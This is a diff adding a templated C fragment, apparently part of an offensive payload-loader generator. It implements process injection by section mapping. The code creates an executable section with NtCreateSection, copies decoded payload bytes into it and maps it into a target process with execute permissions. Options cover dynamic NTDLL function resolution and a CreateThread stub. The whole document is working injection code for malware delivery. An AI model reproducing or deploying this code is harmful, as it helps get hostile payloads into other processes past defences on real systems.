@@ -1,0 +1,48 @@
+{% if section == "globals" %}
+    #include <ntdef.h>
+
+    // http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
+    typedef enum _SECTION_INHERIT {
+      ViewShare = 1,
+      ViewUnmap = 2
+    } SECTION_INHERIT, *PSECTION_INHERIT;	
+
+    {% if link.alloc.functions.value in ["dynamic", "direct"] %}
+        {{ function_typedef("NtCreateSection") }}
+        {{ function_typedef("NtMapViewOfSection") }}
+        {{ function_typedef("NtUnmapViewOfSection") }}
+        {{ function_typedef("CreateThread") }}
+    {% endif %}
+
+    void *alloc(HANDLE hSelfProc, HANDLE hTargetProc, void *decoded, SIZE_T length){
+        {{ function_definition("NtCreateSection", "NTDLL.DLL") }}
+        {{ function_definition("NtMapViewOfSection", "NTDLL.DLL") }}
+        {{ function_definition("NtUnmapViewOfSection", "NTDLL.DLL") }}
+
+        HANDLE hSection = NULL;
+        pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &length, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+        PVOID mem = NULL;
+        pNtMapViewOfSection(hSection, hSelfProc, &mem, NULL, NULL, NULL, &length, ViewUnmap, NULL, PAGE_READWRITE);
+
+        memcpy(mem, decoded, length);
+
+        {% if not stub and stub.yaml_tag != "!modifier.CreateThreadStub" %}
+            pNtUnmapViewOfSection(hSelfProc, mem);
+        {% endif %}
+
+        PVOID pRemoteView = NULL;
+        {% if link.alloc.protection.value == "rx" %}
+            pNtMapViewOfSection(hSection, hTargetProc, &pRemoteView, NULL, NULL, NULL, &length, ViewUnmap, NULL, PAGE_EXECUTE_READ);
+        {% else %}
+            pNtMapViewOfSection(hSection, hTargetProc, &pRemoteView, NULL, NULL, NULL, &length, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
+        {% endif %}
+
+        {% if stub and stub.yaml_tag == "!modifier.CreateThreadStub" %}
+            {{ createThreadStub("local", "mem", "pRemoteView") }}
+            pNtUnmapViewOfSection(hSelfProc, mem);
+        {% endif %}
+
+        return pRemoteView;
+    }
+{% endif %}
